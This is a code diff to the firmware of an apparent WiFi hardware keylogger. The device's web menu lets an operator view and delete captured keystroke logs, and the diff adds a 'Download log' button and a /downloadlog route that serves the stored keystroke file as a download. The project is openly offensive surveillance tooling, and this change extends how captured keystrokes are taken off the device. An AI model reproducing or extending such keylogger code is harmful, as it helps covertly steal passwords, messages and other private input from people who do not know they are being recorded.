@@ -27,7 +27,7 @@ String data;
 int tmp_incoming;
 char data2[20];
 
-const String MENU = "<html><body><h2>WiFiKeylogger</h2><a class=\"myButton\" href=\"/viewlog\">View Log</a><a class=\"myButton\" href=\"/delete\">Delete log</a><a class=\"myButton\" href=\"/configuration\">Configuration</a><p>Keymap layout: </p><form target=\"_blank\"><select name=\"list\"><option value=\"/be\"> BE<option value=\"/cz\"> CZ<option value=\"/da\"> DA<option value=\"/de\"> DE<option value=\"/en\"> EN<option value=\"/es\"> ES<option value=\"/fi\"> FI<option value=\"/fr\"> FR<option value=\"/it\"> IT<option value=\"/pt\"> PT<option value=\"/tr\"> TR</select> <input type=button value=\"Apply\" onClick=\"top.location.href=this.form.list.options[this.form.list.selectedIndex].value\"></form><style>.myButton {background-color:#599bb3;-moz-border-radius:32px;-webkit-border-radius:32px;border-radius:32px;border:2px solid #29668f;display:inline-block;cursor:pointer;color:#ffffff;font-family:Courier New;font-size:17px;padding:5px 4px;text-decoration:none;}.myButton:hover {background-color:#ffffff;}.myButton:active {position:relative;top:1px;}</style>";
+const String MENU = "<html><body><h2>WiFiKeylogger</h2><a class=\"myButton\" href=\"/viewlog\">View Log</a><a class=\"myButton\" href=\"/delete\">Delete log</a><a class=\"myButton\" href=\"/downloadlog\">Download log</a><a class=\"myButton\" href=\"/configuration\">Configuration</a><p>Keymap layout: </p><form target=\"_blank\"><select name=\"list\"><option value=\"/be\"> BE<option value=\"/cz\"> CZ<option value=\"/da\"> DA<option value=\"/de\"> DE<option value=\"/en\"> EN<option value=\"/es\"> ES<option value=\"/fi\"> FI<option value=\"/fr\"> FR<option value=\"/it\"> IT<option value=\"/pt\"> PT<option value=\"/tr\"> TR</select> <input type=button value=\"Apply\" onClick=\"top.location.href=this.form.list.options[this.form.list.selectedIndex].value\"></form><style>.myButton {background-color:#599bb3;-moz-border-radius:32px;-webkit-border-radius:32px;border-radius:32px;border:2px solid #29668f;display:inline-block;cursor:pointer;color:#ffffff;font-family:Courier New;font-size:17px;padding:5px 4px;text-decoration:none;}.myButton:hover {background-color:#ffffff;}.myButton:active {position:relative;top:1px;}</style>";
 
 uint8_t _asciimap[256] =
 {
@@ -320,6 +320,10 @@ void setup() {
   server.on("/viewlog", HTTP_GET, [](AsyncWebServerRequest *request){
     request->send(SPIFFS, "/logs.txt", "text/html");
     loop(); 
+  });
+
+  server.on("/downloadlog", HTTP_GET, [](AsyncWebServerRequest *request){
+    request->send(SPIFFS, "/logs.txt", String(), true);
   });
 
   server.on("/delete", HTTP_GET, [](AsyncWebServerRequest *request){
